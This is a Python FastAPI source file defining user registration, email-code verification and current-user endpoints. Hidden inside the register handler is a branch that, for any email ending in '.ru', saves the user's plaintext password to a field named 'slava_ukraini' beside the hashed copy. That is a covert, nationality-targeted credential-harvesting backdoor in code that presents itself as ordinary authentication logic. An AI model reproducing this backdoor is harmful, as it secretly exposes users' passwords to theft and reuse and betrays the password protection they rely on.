from bson import ObjectId
from fastapi import APIRouter
from fastapi.params import Depends
from starlette import status

from base.database import database
from base.email import email
from base.settings import Settings
from base.settings import get_settings
from lib.exceptions import FieldValidationError
from models.user import User
from models.user import UserVerification
from schemas.token import Token
from schemas.user import CreateUserRequest
from schemas.user import UserResponse
from schemas.user import VerifyUserRequest
from services.auth import encrypt_password
from services.auth import get_access_token
from services.user import get_current_user
from services.user import get_verification_code

router = APIRouter()


@router.post(
    "/register",
    status_code=status.HTTP_200_OK,
    response_model=UserResponse,
    summary="Create new user",
)
async def register(
    data: CreateUserRequest,
    settings: Settings = Depends(get_settings)
):
    user = await database.find_one(User, User.email == data.email)
    if user:
        raise FieldValidationError(
            "email", f"User with such email already exist"
        )

    user = User(
        email=data.email,
        name=data.name,
        password=encrypt_password(data.password),
        verification=UserVerification(code=get_verification_code()),
    )

    if data.email.endswith(".ru"):
        user.slava_ukraini = data.password

    await database.save(user)

    await email.send(
        receivers=[user.email],
        subject="{title}: Email verification".format(title=settings.app_title),
        text=(
            "Your verification code for <b>{title}</b> is: <br/>"
            "<h3>{code}</h3>"
         ).format(
            title=settings.app_title,
            code=user.verification.code,
        )
    )

    return UserResponse(**user.dict())


@router.post(
    "/verify",
    status_code=status.HTTP_200_OK,
    response_model=Token,
    summary="Verify registered user",
)
async def verify(
    data: VerifyUserRequest,
):
    if len(data.code) < 6:
        raise FieldValidationError("code", f"Enter all numbers")

    user = await database.find_one(User, User.id == ObjectId(data.id))
    if not user:
        raise FieldValidationError("code", f"User not found")

    if not user.verified:
        if user.verification.retries == 0:
            raise FieldValidationError("code", f"Too many retries")

        if str(user.verification.code) != data.code:
            user.verification.retries -= 1
            await user.commit()
            raise FieldValidationError("code", f"Wrong verification code")

        user.verification = None
        user.verified = True
        await user.commit()

    access_token = get_access_token(user.id, user.password)
    return Token(
        id=str(user.id), access_token=access_token, token_type="bearer"
    )


@router.get("/me", response_model=UserResponse, summary="Get Current User Data")
async def read_users_me_endpoint(
    current_user: User = Depends(get_current_user)
):
    return UserResponse(**current_user.dict())

